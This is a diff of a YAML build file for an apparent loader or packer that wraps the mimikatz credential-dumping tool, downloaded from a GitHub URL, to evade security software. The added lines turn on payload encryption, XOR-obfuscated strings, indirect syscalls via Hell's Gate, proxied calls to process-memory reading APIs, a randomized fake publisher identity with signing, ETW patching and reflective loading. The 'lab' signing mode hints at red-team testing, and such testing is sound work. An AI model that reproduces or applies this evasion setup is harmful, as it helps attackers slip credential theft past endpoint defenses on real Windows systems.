@@ -7,19 +7,34 @@ name: mimikatz-basic
 build:
   payload:
     source: "https://github.com/ParrotSec/mimikatz/raw/refs/heads/master/x64/mimikatz.exe"
+    # Arguments the payload starts with; the packed binary's own args follow.
     args:
       - "privilege::debug"
-      - "sekurlsa::logonpasswords"
+    # Keep the payload encrypted until the stub needs it at run time.
     crypto:
       algo: xchacha20poly1305
       key: random
 
   stub:
+    # Strings strategy
+    strings:
+      strategy: xor
+    # Syscalls strategy for the loader
     syscalls:
       mode: indirect
       resolver: hells_gate
-    strings:
-      strategy: xor
+    # Serve the selected payload imports from proxies generated in the loader
+    # (requires syscalls: indirect and a pe/dll payload).
+    api_resolution:
+      mode: proxy
+      apis:
+        # - "*" Everyone
+        - "kernel32!ReadProcessMemory"
+        - "kernel32!OpenProcess"
+        - "kernel32!GetProcAddress"
+        - "ntdll!NtReadVirtualMemory"
+        - "ntdll!NtOpenProcess"
+      unmatched: forward # ( forward | abort ) Strategy when the API is not resolved by syscalls module
 
   output:
     path: ./dist/mimikatz_packed.exe
@@ -28,10 +43,13 @@ build:
     trim_paths: all
     resources:
       version_info:
+        # Fill company/product/description/versions with a generated identity.
         randomize: true
     sign:
+      # Generate a lab CA + leaf and sign (the generated company is the subject).
       mode: lab
 
 runtime:
-
+  # Preparation techniques first, then exactly one Execution technique.
+  - technique: patch_etw
   - technique: reflective_loading
